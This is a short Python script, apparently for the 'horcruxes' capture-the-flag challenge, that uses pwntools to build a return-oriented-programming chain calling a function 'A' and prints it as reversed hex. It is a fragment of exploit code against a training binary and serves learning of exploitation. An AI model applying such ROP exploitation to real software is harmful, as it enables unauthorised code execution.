from pwn import *


rop = ROP('./horcruxes')

rop.call('A')
print(rop.chain()[::-1].hex())

